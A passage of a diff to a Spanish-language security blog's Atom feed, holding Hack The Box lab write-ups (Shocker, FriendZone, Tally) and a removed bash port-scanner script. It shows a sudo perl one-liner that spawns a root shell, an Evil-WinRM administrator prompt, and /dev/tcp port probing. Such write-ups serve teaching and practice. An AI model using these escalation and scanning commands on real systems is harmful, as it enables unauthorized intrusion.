class=&quot;o&quot;&gt;)&lt;/span&gt;,116&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;sambashare&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+shelly@Shocker:/home/shelly&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt;
+Matching Defaults entries &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;shelly on Shocker:
+    env_reset, mail_badpass, &lt;span class=&quot;nv&quot;&gt;secure_path&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/usr/local/sbin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/usr/local/bin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/usr/sbin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/usr/bin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/sbin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/bin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/snap/bin
+
+User shelly may run the following commands on Shocker:
+    &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; NOPASSWD: /usr/bin/perl
+shelly@Shocker:/home/shelly&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Vemos que podemos ejecutar el recurso &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/usr/bin/perl&lt;/code&gt; como el usuario &lt;strong&gt;root&lt;/strong&gt;; así que con nuestra página de confianza &lt;a href=&quot;https://gtfobins.github.io/gtfobins/perl/&quot;&gt;GTFOBins&lt;/a&gt; buscaremos una forma de excalar privilegios.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;shelly@Shocker:/home/shelly&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt; /usr/bin/perl &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'exec &quot;/bin/bash&quot;;'&lt;/span&gt;
+root@Shocker:/home/shelly# &lt;span class=&quot;nb&quot;&gt;whoami
+&lt;/span&gt;root
+root@Shocker:/home/shelly#
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Ya somos el usuario &lt;strong&gt;root&lt;/strong&gt; y podemos visualizar la flag (root.txt).&lt;/p&gt;
+
+&lt;p&gt;Se comparte un script autopwn de la máquina &lt;a href=&quot;https://github.com/k4miyo/Shocker-Autopwn&quot;&gt;Shocker Autopwn&lt;/a&gt;.&lt;/p&gt;</content><author><name>K4miyo</name></author><category term="Perl" /><category term="Injection" /><category term="Web" /><summary type="html">Resolución de la máquina Shocker en la plataforma de Hack The Box</summary></entry><entry><title type="html">Hack The Box FriendZone</title><link href="http://localhost:4000/htb-friendzone/" rel="alternate" type="text/html" title="Hack The Box FriendZone" /><published>2021-12-12T00:00:00-06:00</published><updated>2021-12-12T00:00:00-06:00</updated><id>http://localhost:4000/htb-friendzone</id><content type="html" xml:base="http://localhost:4000/htb-friendzone/">&lt;p&gt;&lt;img src=&quot;/assets/images/htb-friendzone/banner-friendzone.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 
 &lt;h2 id=&quot;friendzone&quot;&gt;FriendZone&lt;/h2&gt;
 &lt;p&gt;Se procede con la fase de reconocimiento lanzando primeramente un &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ping&lt;/code&gt; a la dirección IP 10.10.10.123.&lt;/p&gt;
@@ -5409,34 +5641,4 @@ Info: Establishing connection to remote endpoint
 &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;Evil-WinRM&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; PS C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\A&lt;/span&gt;dministrator&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;ocuments&amp;gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-&lt;p&gt;Ya somo el usuario &lt;strong&gt;Administrator&lt;/strong&gt; y podemos visualizar la flag (root.txt).&lt;/p&gt;</content><author><name>K4miyo</name></author><category term="Windows" /><category term="SQL" /><category term="C" /><category term="Patch Management" /><summary type="html">Resolución de la máquina Tally en la plataforma de Hack The Box</summary></entry><entry><title type="html">Archivo portScan</title><link href="http://localhost:4000/portScan/" rel="alternate" type="text/html" title="Archivo portScan" /><published>2021-11-26T00:00:00-06:00</published><updated>2021-11-26T00:00:00-06:00</updated><id>http://localhost:4000/portScan</id><content type="html" xml:base="http://localhost:4000/portScan/">&lt;p&gt;&lt;img src=&quot;/assets/images/portscan/banner-portscan.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;h2 id=&quot;archivo-portscan&quot;&gt;Archivo portScan&lt;/h2&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#!/bin/bash&lt;/span&gt;
-
-&lt;span class=&quot;k&quot;&gt;function &lt;/span&gt;ctrl_c&lt;span class=&quot;o&quot;&gt;(){&lt;/span&gt;
-    &lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;[!] Saliendo...&quot;&lt;/span&gt;
-    tput cnorm
-    &lt;span class=&quot;nb&quot;&gt;exit &lt;/span&gt;1
-&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
-
-&lt;span class=&quot;nb&quot;&gt;trap &lt;/span&gt;ctrl_c INT
-
-&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$# &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-ne&lt;/span&gt; 1 &lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;then
-    &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;[*] Uso: &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$0&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; &amp;lt;ip_address&amp;gt;&quot;&lt;/span&gt;
-    &lt;span class=&quot;nb&quot;&gt;exit &lt;/span&gt;1
-&lt;span class=&quot;k&quot;&gt;fi
-
-&lt;/span&gt;tput civis&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;counter&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1000
-
-&lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;port &lt;span class=&quot;k&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;seq &lt;/span&gt;1 65535&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;do
-    &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;timeout &lt;/span&gt;1 bash &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;echo '' &amp;gt; /dev/tcp/&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$1&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$port&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt; 2&amp;gt;/dev/null &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;[*] Puerto abierto -&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\t&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$port&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt; &amp;amp;
-    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$port&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-eq&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$counter&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;then
-        &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;[*] &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$counter&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; puertos escaneados&quot;&lt;/span&gt;
-	&lt;span class=&quot;nb&quot;&gt;let &lt;/span&gt;counter+&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1000
-    &lt;span class=&quot;k&quot;&gt;fi
-done&lt;/span&gt;
-
-
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name>K4miyo</name></author><category term="Bash" /><category term="Ports" /><category term="Enumeration" /><summary type="html">Archivo portScan para el descubrimiento de puertos abiertos</summary></entry></feed>
+&lt;p&gt;Ya somo el usuario &lt;strong&gt;Administrator&lt;/strong&gt; y podemos visualizar la flag (root.txt).&lt;/p&gt;</content><author><name>K4miyo</name></author><category term="Windows" /><category term="SQL" /><category term="C" /><category term="Patch Management" /><summary type="html">Resolución de la máquina Tally en la plataforma de Hack The Box</summary></entry></feed>
